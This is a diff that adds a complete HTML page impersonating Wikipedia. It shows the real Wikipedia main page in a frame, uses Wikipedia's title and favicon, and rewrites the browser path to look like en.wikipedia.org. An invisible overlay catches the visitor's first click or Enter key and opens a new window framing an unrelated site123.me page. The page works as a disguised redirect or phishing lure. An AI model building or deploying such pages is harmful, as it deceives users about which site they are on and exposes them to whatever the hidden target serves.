@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Wikipedia, the free encyclopedia</title>
+<link rel="icon" href="https://www.wikipedia.org/favicon.ico" />
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body { height: 100%; overflow: hidden; }
+  #stage0, #stage1 { position: absolute; inset: 0; }
+  .fade { transition: opacity .38s ease; }
+  .fade-out { opacity: 0; pointer-events: none; }
+  .hidden { display: none !important; }
+  .spin { animation: spin 1s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  #loader { position: absolute; inset: 0; display: grid; place-items: center; background: #fff; z-index: 20; }
+  .spinner { width: 28px; height: 28px; border-radius: 50%; border: 2px solid rgba(0,0,0,0.1); border-top-color: #3366cc; }
+</style>
+</head>
+<body>
+
+<div id="stage0" class="fade">
+  <iframe src="https://en.wikipedia.org/wiki/Main_Page" style="position:absolute;inset:0;width:100%;height:100%;border:0;" allow="fullscreen"></iframe>
+  <div id="clickCatcher" style="position:absolute;inset:0;z-index:30;"></div>
+</div>
+
+<div id="stage1" class="fade fade-out hidden">
+  <div id="loader"><div class="spinner spin"></div></div>
+  <iframe id="targetFrame" style="position:absolute;inset:0;width:100%;height:100%;border:0;z-index:10;" src="" allow="fullscreen"></iframe>
+</div>
+
+<script>
+(function(){
+  var TARGET = "https://6aa55a9763ad2.site123.me/";
+  var stage0 = document.getElementById('stage0');
+  var stage1 = document.getElementById('stage1');
+  var loader = document.getElementById('loader');
+  var frame  = document.getElementById('targetFrame');
+  var swapped = false;
+
+  try { history.replaceState(null,'','/en.wikipedia.org/wiki/Main_Page'); } catch(e){}
+
+  function doSwap(){
+    if(swapped) return;
+    swapped = true;
+    var w = window.open('about:blank', '_blank');
+    w.document.write('<html><head><style>*{margin:0;padding:0}html,body{height:100%;overflow:hidden}</style></head><body><iframe src="' + TARGET + '" style="position:absolute;inset:0;width:100%;height:100%;border:0;" allow="fullscreen"></iframe></body></html>');
+    w.document.close();
+  }
+
+  document.getElementById('clickCatcher').addEventListener('click', doSwap);
+  document.addEventListener('keydown', function(e){ if(!swapped && e.key==='Enter') doSwap(); });
+})();
+</script>
+</body>
+</html>
